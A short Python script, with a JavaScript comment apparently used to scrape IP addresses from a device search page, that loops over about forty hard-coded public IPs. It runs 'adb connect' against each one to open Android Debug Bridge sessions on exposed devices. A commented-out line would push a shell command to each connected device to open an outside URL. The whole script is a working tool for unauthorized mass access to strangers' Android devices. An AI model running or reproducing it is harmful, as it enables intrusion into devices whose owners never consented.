# prompt('ctrl+c, enter',JSON.stringify([...document.querySelector("body > div.container.u-full-width.card.card-padding > div > div.nine.columns").children].filter(e=>e.className=='result').map(e=>e.children[1].innerText)))
ips =  ["122.142.208.198","69.167.8.69","119.200.62.232","99.46.43.23","14.47.118.190","223.19.223.20","42.2.167.139","201.209.218.63","49.142.208.16","61.166.112.157"]
ips += ["128.90.30.171","223.210.21.148","223.210.21.147","190.74.164.181","185.198.181.52","94.19.1.93","112.14.16.32","218.172.62.208","190.219.2.102","119.205.101.165"]
ips += ["119.200.62.232","14.47.118.190","49.142.208.16","119.205.101.165","155.230.172.94","14.47.138.84","58.142.37.16","59.9.48.200","218.147.202.19","218.52.181.141"]
ips += ["220.93.133.68","14.71.6.155","20.39.197.228","121.143.93.124","115.23.220.191","119.200.206.27","14.47.138.122","61.79.218.215","221.163.53.78","220.86.236.16"]
# ips += 
ips = set(ips)
import subprocess
for ip in ips:
    commands = [
        ['adb', 'connect', ip],
        # ['adb', '-s', ip, 'shell', 'httpurl', 'http://copy.sh']
        ['adb', 'disconnect', ip],
    ]
    for command in commands:
        p = subprocess.Popen(command)
        try:
            p.wait(1)
        except subprocess.TimeoutExpired:
            p.kill()
            break
        if p.returncode:
            break
        
    


